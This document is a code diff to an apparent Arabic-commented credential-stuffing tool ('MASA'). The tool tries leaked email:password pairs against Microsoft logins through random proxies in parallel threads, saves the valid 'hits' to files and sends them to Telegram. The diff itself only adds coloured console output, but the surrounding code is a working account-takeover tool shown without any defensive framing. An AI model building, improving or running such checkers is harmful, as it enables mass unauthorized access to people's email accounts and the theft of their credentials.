@@ -5,6 +5,11 @@ import requests
 from mailhub import MailHub
 from concurrent.futures import ThreadPoolExecutor
 import os
+from colorama import Fore, Style
+
+# تهيئة مكتبة colorama
+from colorama import init
+init(autoreset=True)
 
 # عرض الشعار
 logo = pyfiglet.figlet_format('MASA')
@@ -30,7 +35,7 @@ def attempt_login(email, password, proxy, hits_file, local_hits_file):
     try:
         res = mail.loginMICROSOFT(email, password, proxy)[0]
         if res == "ok":
-            print(f"Valid   | {email}:{password}")
+            print(f"{Fore.GREEN}Valid   | {email}:{password}{Style.RESET_ALL}")
             with write_lock:
                 hits_file.write(f"{email}:{password}\n")
                 hits_file.flush()
@@ -38,9 +43,9 @@ def attempt_login(email, password, proxy, hits_file, local_hits_file):
                 local_hits_file.flush()
                 send_to_telegram(email, password)  
         else:
-            print(f"Invalid | {email}:{password}")
+            print(f"{Fore.RED}Invalid | {email}:{password}{Style.RESET_ALL}")
     except Exception as e:
-        print(f"Error logging in {email}:{password} - {str(e)}")
+        print(f"{Fore.YELLOW}Error logging in {email}:{password} - {str(e)}{Style.RESET_ALL}")
 
 # دالة لإرسال رسالة إلى تيليجرام
 def send_to_telegram(email, password):
@@ -72,14 +77,14 @@ def process_combo_file(hits_file, local_hits_file, proxies, combo_path):
                 for line in file:
                     email, password = validate_line(line)
                     if email is None or password is None:
-                        print(f"Invalid format in line: {line.strip()}")
+                        print(f"{Fore.YELLOW}Invalid format in line: {line.strip()}{Style.RESET_ALL}")
                         continue
                     proxy = {"http": f"http://{random.choice(proxies).strip()}"} if proxies else None
                     futures.append(executor.submit(attempt_login, email, password, proxy, hits_file, local_hits_file))
                 for future in futures:
                     future.result()
     except Exception as e:
-        print(f"Error processing combo file: {e}")
+        print(f"{Fore.RED}Error processing combo file: {e}{Style.RESET_ALL}")
 
 # الدالة الرئيسية
 def main():
